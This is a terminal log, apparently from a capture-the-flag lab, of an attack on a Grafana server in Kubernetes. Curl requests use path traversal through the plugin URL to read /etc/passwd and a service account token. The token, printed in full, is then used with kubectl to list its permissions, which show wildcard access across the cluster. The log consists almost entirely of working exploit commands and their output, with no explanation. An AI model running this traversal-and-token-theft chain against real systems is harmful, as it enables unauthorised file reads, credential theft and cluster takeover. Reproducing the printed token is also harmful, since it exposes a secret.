challenge@syringe-79b66d66d7-6xdjz:/tmp$ curl --path-as-is 10.105.120.1:3000/public/plugins/alertGroups/../../../../../../../../etc/passwd
<gins/alertGroups/../../../../../../../../etc/passwd
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1230  100  1230    0     0   600k      0 --:--:-- --:--:-- --:--:-- 1201k
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin

challenge@syringe-79b66d66d7-6xdjz:/tmp$ curl --path-as-is 10.105.120.1:3000/public/plugins/alertGroups/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
</var/run/secrets/kubernetes.io/serviceaccount/token
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1022  100  1022    0     0   499k      0 --:--:-- --:--:-- --:--:--  499k
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpwcUhIZ1hyRF9FbGYyQ1piWHNiemZhNGpnSTl0Z3Z1X2dMeFAtTURUaVUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzA5NDI0OTA4LCJpYXQiOjE2Nzc4ODg5MDgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItZjlqczUiLCJ1aWQiOiI4N2RiNDhiMC1kMTc2LTQyOGMtOWZhNS0yZDVkMzlmMjU4NjcifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6ImIwMWIwODc5LWNlMDItNDAxNC1iNjEyLTEyOWVlYzAxNjdiNCJ9LCJ3YXJuYWZ0ZXIiOjE2Nzc4OTI1MTV9LCJuYmYiOjE2Nzc4ODg5MDgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.BXeI8ejqdRieINmEmHnFHj8navP0zIQ0CPebkTxEgv1AEgzIkhunEbg8xg1BefyjJXMryqo60SJaR6y4fcd3fx7ocfbF5hh3M2QfQpeR4iQVv4g-pJ7z3thd47W2DKQp9_xDMCglIUeJx07L8aJErHJwII9qvK_A7yWC6a6G6nfumsrE5TWSf9ldXUyF4TmJEb5rcALOXiCbFpD488Onb-I4oLouDgQuV8XGYz2WExTGIb42YquIWaTrZMHZ8LrEDpXbiHPKRy4_QE2F7q1UVIJaJJsA3cUqpt2dO0yVLHD19mvoW_MMXBlWTTU-wohIf1ORI8NYENXPnE14dDroFgc

challenge@syringe-79b66d66d7-6xdjz:/tmp$ export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpwcUhIZ1hyRF9FbGYyQ1piWHNiemZhNGpnSTl0Z3Z1X2dMeFAtTURUaVUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzA5NDI0OTA4LCJpYXQiOjE2Nzc4ODg5MDgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItZjlqczUiLCJ1aWQiOiI4N2RiNDhiMC1kMTc2LTQyOGMtOWZhNS0yZDVkMzlmMjU4NjcifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6ImIwMWIwODc5LWNlMDItNDAxNC1iNjEyLTEyOWVlYzAxNjdiNCJ9LCJ3YXJuYWZ0ZXIiOjE2Nzc4OTI1MTV9LCJuYmYiOjE2Nzc4ODg5MDgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.BXeI8ejqdRieINmEmHnFHj8navP0zIQ0CPebkTxEgv1AEgzIkhunEbg8xg1BefyjJXMryqo60SJaR6y4fcd3fx7ocfbF5hh3M2QfQpeR4iQVv4g-pJ7z3thd47W2DKQp9_xDMCglIUeJx07L8aJErHJwII9qvK_A7yWC6a6G6nfumsrE5TWSf9ldXUyF4TmJEb5rcALOXiCbFpD488Onb-I4oLouDgQuV8XGYz2WExTGIb42YquIWaTrZMHZ8LrEDpXbiHPKRy4_QE2F7q1UVIJaJJsA3cUqpt2dO0yVLHD19mvoW_MMXBlWTTU-wohIf1ORI8NYENXPnE14dDroFgc
<O0yVLHD19mvoW_MMXBlWTTU-wohIf1ORI8NYENXPnE14dDroFgc

challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl auth can-i --list --token=$TOKEN
<jz:/tmp$ ./kubectl auth can-i --list --token=$TOKEN
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
